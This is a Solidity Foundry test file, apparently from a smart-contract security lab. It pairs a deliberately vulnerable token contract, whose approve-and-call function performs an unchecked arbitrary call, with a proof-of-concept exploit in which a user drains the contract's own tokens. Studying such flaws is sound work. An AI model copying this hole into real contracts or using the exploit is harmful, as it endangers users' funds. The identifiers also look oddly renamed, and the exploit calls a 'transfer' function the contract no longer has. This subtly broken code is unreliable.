pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    RealmcoinWhale GoldtokenWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        GoldtokenWhaleContract = new RealmcoinWhale();
        GoldtokenWhaleContract.GamecoinWhaleDeploy(address(GoldtokenWhaleContract));
        console.log(
            "TokenWhale balance:",
            GoldtokenWhaleContract.itemcountOf(address(GoldtokenWhaleContract))
        );


        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        GoldtokenWhaleContract.authorizedealAndCallcode(
            address(GoldtokenWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(GoldtokenWhaleContract.itemcountOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            GoldtokenWhaleContract.itemcountOf(address(GoldtokenWhaleContract))
        );
        console.log(
            "Alice balance:",
            GoldtokenWhaleContract.itemcountOf(address(alice))
        );
    }

    receive() external payable {}
}

contract RealmcoinWhale {
    address player;

    uint256 public worldSupply;
    mapping(address => uint256) public itemcountOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function GamecoinWhaleDeploy(address _player) public {
        player = _player;
        worldSupply = 1000;
        itemcountOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return itemcountOf[player] >= 1000000;
    }

    event SendGold(address indexed from, address indexed to, uint256 value);

    function _sendgold(address to, uint256 value) internal {
        itemcountOf[msg.sender] -= value;
        itemcountOf[to] += value;

        emit SendGold(msg.sender, to, value);
    }

    function shareTreasure(address to, uint256 value) public {
        require(itemcountOf[msg.sender] >= value);
        require(itemcountOf[to] + value >= itemcountOf[to]);

        _sendgold(to, value);
    }

    event Approval(
        address indexed realmLord,
        address indexed spender,
        uint256 value
    );

    function allowTransfer(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function giveitemsFrom(address from, address to, uint256 value) public {
        require(itemcountOf[from] >= value);
        require(itemcountOf[to] + value >= itemcountOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _sendgold(to, value);
    }


    function authorizedealAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}